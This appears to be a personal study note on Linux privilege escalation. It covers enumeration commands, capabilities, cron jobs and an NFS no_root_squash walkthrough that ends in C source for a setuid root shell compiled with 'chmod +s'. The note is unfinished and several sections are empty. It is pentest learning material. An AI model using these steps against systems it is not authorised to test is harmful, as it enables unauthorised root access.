---
creation date: January 8th 2023
last modified date: January 8th 2023
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: [[Privilege Escalation]]
Search Tag: #📕  

# [[Linux Privilege Escalation]]  
___

## Description:  

## Enumeration
### Automated Tools
- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

### Hostname
- `hostname`

### Kernel Information
- `uname -a`

### Target System Processes
- `cat /proc/version`

### Target OS Information
- `cat /etc/issue`

### Process Status
- `ps`
- `ps -A` = View all running processes

### Environmental Variables
- `env`

### List all root commands current user has
- `sudo -l`

## Capabilities
### Description
This is when a system admin increase the privilege level of a process or binary. This essentially means that rather than giving a user higher permission an admin can lower the requirements needed in order to allow a command to execute.

### List tools that were increased
- `getcap -r /`
- If unprivileged user then run: `getcap -r / 2>/dev/null`
	- This will throw all errors we will get into `/dev/null`

## Cron Jobs
### Description
These are set jobs timed to run at set intervals. They might running as root and be editable which is where we could have them do something like call out to a reverse shell.

### Locating
`cat /etc/crontab`

## NFS
### Description
Network File Share can be a good way to find shares possible with root access. This means rather than escalating our current user we could open a shell by adding a script.

### Locating
`cat /etc/exports`
We are looking for shares that have the **no_root_squash** option.  If this option is set on a share we can write to then we can add the executable.

### Exploiting
1. Once we have found shares we can write to and have the **no_root_squash**.
2. We need to mount the drive to our system so we can work on it.
3. `showmount -e 10.10.10.10`
	- This will list the exports of the NFS
4. `mkdir /tmp/backupofattackermachine`
5. `sudo mount -o rw 10.10.10.10:<LOCATION_OF_EXPORT> /tmp/backupofattackmachine`
	- This will mount the NFS to our tmp folder meaning it will be removed when we reboot our computer
6. Now we need to write and compile our executable a few example listed below:
```c
int main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

```c
#include<unistd.h>
void main()
{ setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```
7. Once we create the file on our newly mounted drive we need to run a few more commands to get it ready
8. `gcc nfs.c -o nfs -w`
9. `chmod +s nfs`
10. 

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: January 8th 2023 (10:52 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
